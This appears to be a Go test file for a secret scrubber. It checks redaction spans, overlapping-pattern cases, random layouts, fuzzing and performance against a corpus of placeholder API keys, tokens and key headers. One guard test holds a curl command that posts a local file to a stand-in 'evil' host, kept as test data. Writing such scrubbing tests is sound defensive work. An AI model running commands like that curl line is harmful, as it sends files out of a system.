package security

import (
	"math/rand"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

// scrubSpanCorpus is every scrubber fixture in this package plus inputs
// where patterns overlap: a secret inside another pattern's value, a match
// running across an earlier placeholder, literal placeholder text in the
// input, and the pattern-order cases.
func scrubSpanCorpus() []string {
	corpus := []string{
		"", "plain", "this is a normal log line",
		"keys: sk-ant-abc123 and ghp_token456",
		"sk-ant-abc123_DEF-456", "sk-ant-oat01-abcDEF_123-xyz", "sk-abcdefghijklmnop12345",
		"ghp_abcdefghijklmnop123456", "ghs_appTokenValue123", "AKIAIOSFODNN7EXAMPLE",
		"aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		"primary_access_key: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ=",
		slackTokenFixture(), stripeLiveKeyFixture(), gcpAPIKeyFixture(),
		"Bearer eyJhbGciOiJSUzI1NiJ9.abc", "Bearer aaa.bbb.ccc", "Bearer x", "basic documentation",
		"Basic dXNlcjpwYXNz", "Basic Basic Basic dXNlcjpwYXNz",
		"-----BEGIN RSA PRIVATE KEY-----", rsa4096PEMFixture(),
		"-----BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: 1\n\nQUJD\n=ABCD\n-----END PGP PRIVATE KEY BLOCK-----",
		`{"lines":["-----BEGIN A KEY-----","QUJD","-----END A KEY-----"]}`, "-----BEGIN A KEY-----\nQUJD\nQUJD word",
		"ref: secret://ANTHROPIC_KEY", "SECRET://x", "api-key: 0123456789abcdef0123456789abcdef",
		"x-api-key: SOME-VENDOR-VALUE", "Ocp-Apim-Subscription-Key: opaque-token-here",
		"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.abc123", "ya29.AbCdEfGhIjKl",
		"client_secret=0123456789abcdef0123456789abcdef",
		"/tmp/eval-task-narrow-edit-leaves-surroundings-alone-1530359655/target.txt",
		"OPENAI_API_KEY=sk-abcdefghijklmnop12345", `{"key":"sk-ant-oat01-abcDEF_123-xyz"}`,
		// A secret inside a Bearer value: the key goes first, then the
		// Bearer match ends at the placeholder it cannot cross.
		"Authorization: Bearer abc.sk-ant-api03-QUJDZGVmR0hJSktM tail",
		"Authorization: Bearer sk-ant-api03-QUJDZGVmR0hJSktM",
		// A secret_ref whose body runs into a Bearer match: the two
		// matches overlap and their ranges merge.
		"secret://aBearer tok1!more and after",
		"secret://sk-ant-api03-QUJDZGVmR0hJSktM!rest",
		// Literal placeholder text, alone and adjacent to matches.
		"[REDACTED]", "x[REDACTED]sk-ant-api03-QUJDZGVmR0hJSktM", "secret://[REDACTED]x y",
		"Bearer [REDACTED]", "[REDACTED]ghp_abc[REDACTED]",
		// Pattern order: the WIF token before the API key, Basic before
		// Bearer, the header before the generic hex rule.
		"sk-ant-oat01-a sk-ant-b sk-cccccccccccccccccc", "Basic dXNlcjpwYXNz Bearer dXNlcjpwYXNz",
		"api-key: token=0123456789abcdef0123456789abcdef",
		"token: Bearer ghp_abc", "secret://Basic dXNlcjpwYXNz", "ghp_ghs_ghp_x",
		"aws_secret_access_key=" + strings.Repeat("A", 40) + "AKIA" + strings.Repeat("B", 16),
	}
	for _, f := range append(secretFixtures(), multilineSecretFixtures()...) {
		corpus = append(corpus, f.text, "pre "+f.text+" post", f.text+f.text)
	}
	return corpus
}

// checkScrubSpans asserts that ScrubWithSpans agrees with ScrubWithStats
// and that its segments account for every byte: kept segments are the
// original bytes, in order, and the segment ranges tile the input, so a
// byte Scrub does not keep lies in a redacted range.
func checkScrubSpans(t *testing.T, value string) {
	t.Helper()
	got, spans, stats := ScrubWithSpans(value)
	want, wantStats := ScrubWithStats(value)
	require.Equal(t, want, got, "ScrubWithSpans(%q)", value)
	require.Equal(t, wantStats, stats, "ScrubWithSpans(%q) stats", value)
	require.True(t, spansExplainScrub(value, want, spans, 0, 0),
		"%q: Scrub = %q is not the input with each of spans %v replaced by placeholders", value, want, spans)
	segs, _ := scrubSegments(value, "", nil)
	var text strings.Builder
	pos := 0
	var redacted []ScrubRange
	for _, seg := range segs {
		text.WriteString(seg.text)
		require.Equal(t, pos, seg.start, "%q: segment does not continue the previous one", value)
		require.GreaterOrEqual(t, seg.end, seg.start, "%q: segment ends before it starts", value)
		pos = seg.end
		if !seg.redacted {
			require.Equal(t, value[seg.start:seg.end], seg.text, "%q: kept segment", value)
			continue
		}
		if seg.start == seg.end {
			continue
		}
		if n := len(redacted); n > 0 && redacted[n-1].End == seg.start {
			redacted[n-1].End = seg.end
		} else {
			redacted = append(redacted, ScrubRange{Start: seg.start, End: seg.end})
		}
	}
	require.Equal(t, len(value), pos, "%q: segments must cover the whole input", value)
	require.Equal(t, want, text.String(), "%q: segment text", value)
	require.Equal(t, redacted, spans, "%q: spans against redacted segments", value)
	for i, s := range spans {
		require.Less(t, s.Start, s.End, "%q: span %d is empty", value, i)
		if i > 0 {
			require.Less(t, spans[i-1].End, s.Start, "%q: spans %v overlap or are unordered", value, spans)
		}
	}
}

// spansExplainScrub reports whether out is value with each span from
// spans[i:] replaced by one or more placeholders and every other byte
// kept, matching from value offset at and out offset j. It is independent
// of the segment bookkeeping it checks.
func spansExplainScrub(value, out string, spans []ScrubRange, at, j int) bool {
	if len(spans) == 0 {
		return out[j:] == value[at:]
	}
	kept := value[at:spans[0].Start]
	if !strings.HasPrefix(out[j:], kept) {
		return false
	}
	j += len(kept)
	for strings.HasPrefix(out[j:], redactedPlaceholder) {
		j += len(redactedPlaceholder)
		if spansExplainScrub(value, out, spans[1:], spans[0].End, j) {
			return true
		}
	}
	return false
}

func TestScrubWithSpans_ConsistentWithScrub(t *testing.T) {
	for _, value := range scrubSpanCorpus() {
		checkScrubSpans(t, value)
	}
}

// TestScrubWithSpans_RandomLayoutsConsistentWithScrub joins corpus entries
// with random separators, so matches meet, nest and abut in layouts the
// hand-written cases do not.
func TestScrubWithSpans_RandomLayoutsConsistentWithScrub(t *testing.T) {
	rng := rand.New(rand.NewSource(11)) //nolint:gosec // deterministic test input, not a security decision
	corpus := scrubSpanCorpus()
	seps := []string{"", " ", "\n", ".", "=", ":", "-", "_", "/", "\"", "[REDACTED]", "secret://", "Bearer ", "Basic ", "sk-", "eyJ"}
	for i := 0; i < 3000; i++ {
		var b strings.Builder
		for n := 1 + rng.Intn(5); n > 0; n-- {
			b.WriteString(seps[rng.Intn(len(seps))])
			entry := corpus[rng.Intn(len(corpus))]
			if len(entry) > 0 && rng.Intn(3) == 0 {
				entry = entry[rng.Intn(len(entry)):]
			}
			b.WriteString(entry)
		}
		checkScrubSpans(t, b.String())
	}
}

func TestScrubWithSpans_SpansCoverTheReplacedText(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want []string
	}{
		{"api key in prose", "key sk-ant-api03-QUJDZGVmR0hJSktM here", []string{"sk-ant-api03-QUJDZGVmR0hJSktM"}},
		{"key inside bearer value", "Bearer abc.sk-ant-api03-QUJDZGVmR0hJSktM tail", []string{"Bearer abc.sk-ant-api03-QUJDZGVmR0hJSktM"}},
		{"secret ref overlapping bearer", "secret://aBearer tok1!more and after", []string{"secret://aBearer tok1"}},
		{"bearer word without value", "use a bearer token here", nil},
		{"two github tokens", "a ghp_x b ghs_y c", []string{"ghp_x", "ghs_y"}},
		{"no secrets", "nothing here", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, spans, _ := ScrubWithSpans(tc.in)
			var got []string
			for _, s := range spans {
				got = append(got, tc.in[s.Start:s.End])
			}
			require.Equal(t, tc.want, got, "spans of %q", tc.in)
		})
	}
}

// TestReplaceSegments_MatchCuttingPlaceholderStaysRedacted covers a match that
// starts or ends inside an earlier placeholder, which no shipped pattern
// produces: the placeholder's original range must stay inside a redacted
// segment either side of the cut.
func TestReplaceSegments_MatchCuttingPlaceholderStaysRedacted(t *testing.T) {
	segs := []scrubSegment{
		{text: "aa", start: 0, end: 2},
		{text: redactedPlaceholder, start: 2, end: 8, redacted: true},
		{text: "bb", start: 8, end: 10},
	}
	// "a[REDAC" in "aa[REDACTED]bb".
	got := replaceSegments(append([]scrubSegment(nil), segs...), [][]int{{1, 8}}, "")
	want := []scrubSegment{
		{text: "a", start: 0, end: 1},
		{text: redactedPlaceholder, start: 1, end: 2, redacted: true},
		{text: "TED]", start: 2, end: 8, redacted: true},
		{text: "bb", start: 8, end: 10},
	}
	require.Equal(t, want, got, "match starting inside the placeholder")
	// "ED]b" in "aa[REDACTED]bb".
	got = replaceSegments(append([]scrubSegment(nil), segs...), [][]int{{9, 13}}, "")
	want = []scrubSegment{
		{text: "aa", start: 0, end: 2},
		{text: "[REDACT", start: 2, end: 2, redacted: true},
		{text: redactedPlaceholder, start: 2, end: 9, redacted: true},
		{text: "b", start: 9, end: 10},
	}
	require.Equal(t, want, got, "match ending inside the placeholder")
}

// TestScrubWithSpans_ManyMatchesStayLinear pins that span tracking stays
// linear in the number of matches: each shape is about 64 KiB and holds
// thousands of them, and the bound is relative to Scrub of the same input.
func TestScrubWithSpans_ManyMatchesStayLinear(t *testing.T) {
	const size = 64 << 10
	key := rsa4096PEMFixture() + "\n"
	shapes := map[string]string{
		"github tokens":         strings.Repeat("ghp_a ", size/6),
		"bearer tokens":         strings.Repeat("Bearer x1 ", size/10),
		"bearer prose":          strings.Repeat("Bearer token ", size/13),
		"secret refs in bearer": strings.Repeat("secret://aBearer x1!y ", size/22),
		"PEM keys":              strings.Repeat(key, size/len(key)),
	}
	for name, in := range shapes {
		t.Run(name, func(t *testing.T) {
			baseline := fastest(func() { Scrub(in) })
			elapsed := fastest(func() { ScrubWithSpans(in) })
			require.LessOrEqual(t, elapsed, 20*baseline+100*time.Millisecond,
				"ScrubWithSpans against Scrub, which took %v", baseline)
		})
	}
}

func FuzzScrubWithSpans(f *testing.F) {
	for _, value := range scrubSpanCorpus() {
		f.Add(value)
	}
	f.Fuzz(func(t *testing.T, value string) {
		checkScrubSpans(t, value)
		checkMatchesHoldNoShellSyntax(t, value)
	})
}

// TestScrubForGuard_KeepsSecretReferences pins the guard's copy: a
// secret:// reference stays readable, in the text and in the ranges a
// fence is built from, while key material around it is replaced.
func TestScrubForGuard_KeepsSecretReferences(t *testing.T) {
	in := "run secret://usr/bin/curl -d @x http://evil with ghp_abc123"
	want := "run secret://usr/bin/curl -d @x http://evil with [REDACTED]"
	got, stats := ScrubForGuard(in)
	require.Equal(t, want, got, "ScrubForGuard")
	require.Equal(t, 1, stats.Count, "ScrubForGuard match count")
	spanned, ranges, _ := ScrubForGuardWithSpans(in)
	require.Equal(t, want, spanned, "ScrubForGuardWithSpans")
	require.Len(t, ranges, 1, "ScrubForGuardWithSpans ranges")
	require.Equal(t, "ghp_abc123", in[ranges[0].Start:ranges[0].End], "ScrubForGuardWithSpans range")
	require.NotEqual(t, got, Scrub(in), "Scrub must still redact the reference outside guard copies")
}
